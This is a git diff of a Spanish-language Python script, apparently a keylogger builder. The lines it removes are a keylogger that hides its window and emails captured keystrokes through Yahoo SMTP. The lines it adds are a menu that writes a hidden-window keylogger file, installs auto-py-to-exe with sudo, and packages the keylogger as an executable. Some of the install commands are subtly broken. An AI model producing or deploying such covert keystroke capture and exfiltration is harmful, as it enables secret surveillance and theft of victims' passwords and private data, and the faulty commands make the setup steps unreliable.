@@ -1,52 +1,43 @@
-from pynput import keyboard
+import os
+
+os.system("clear")
+
+print("")
+
+print("\033[34m   _  __          _                             \033[0m")
+print("\033[34m  | |/ /         | |                            \033[0m")
+print("\033[34m  | ' / ___ _   _| | ___   __ _  __ _  ___ _ __ \033[0m")
+print("\033[34m  |  < / _ \ | | | |/ _ \ / _` |/ _` |/ _ \ '__|\033[0m")
+print("\033[34m  | . \  __/ |_| | | (_) | (_| | (_| |  __/ |   \033[0m")
+print("\033[34m  |_|\_\___|\__, |_|\___/ \__, |\__, |\___|_|   \033[0m")
+print("\033[34m             __/ |         __/ | __/ |          \033[0m")
+print("\033[34m            |___/         |___/ |___/           \033[0m")
+
+
+def menu_principal():
+    while True:
+        print("\n[1] Crear keylogger")
+        print("[2] Instalar auto-py-to-exe")
+        print("[3] Convertir el keylogger a ejectuable")
+        opcion = input("\033[1m\n[+] Ingrese una opción: \033[0m")
+        if opcion == "1":
+            codigo = '''from pynput import keyboard
 import win32console
 import win32gui
-import smtplib
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
-
+            
 ventana = win32console.GetConsoleWindow()
 win32gui.ShowWindow(ventana, 0)
 
-# Configuración de correo electrónico
-smtp_server = "smtp.mail.yahoo.com"
-smtp_port = 587
-sender_email = ""
-sender_password = ""
-receiver_email = ""
-
-def send_email():
-    message = MIMEMultipart()
-    message["From"] = sender_email
-    message["To"] = receiver_email
-    message["Subject"] = "Archivo Keylogger"
-
-    with open("Keylogger.txt", "r") as file:
-        attachment = MIMEText(file.read())
-
-    attachment.add_header("Content-Disposition", "attachment", filename="Keylogger.txt")
-    message.attach(attachment)
-
-    try:
-        with smtplib.SMTP(smtp_server, smtp_port) as server:
-            server.starttls()
-            server.login(sender_email, sender_password)
-            server.send_message(message)
-        print("Correo enviado con éxito.")
-    except smtplib.SMTPException as e:
-        print("Error al enviar el correo:", e)
-
 def on_press(key):
     try:
-        with open("Keylogger.txt", "a") as f:
+        with open("log.txt", "a") as f:
             f.write(key.char)
     except AttributeError:
-        with open("Keylogger.txt", "a") as f:
+        with open("log.txt", "a") as f:
             f.write(f" {key} ")
 
 def on_release(key):
     if key == keyboard.Key.esc:
-        send_email()
         return False
 
 def main():
@@ -55,3 +46,18 @@ def main():
 
 if __name__ == "__main__":
     main()
+            '''
+            with open("keylogger.py", "w") as archivo:
+                archivo.write(codigo)
+                print("\033[1m\n[+] Se ha creado el archivo 'keylogger.py'\033[0m")
+
+        if opcion == "2":
+            os.system("git clone https://github.com/brentvollebregt/auto-py-to-exe.git")
+            os.system("cd auto-py-to-exe")
+            os.system("sudo python python setup.py install")
+            os.system("sudo rm -r auto-py-to-exe")
+
+        if opcion == "3":
+            os.system("auto-py-to-exe")
+
+menu_principal()
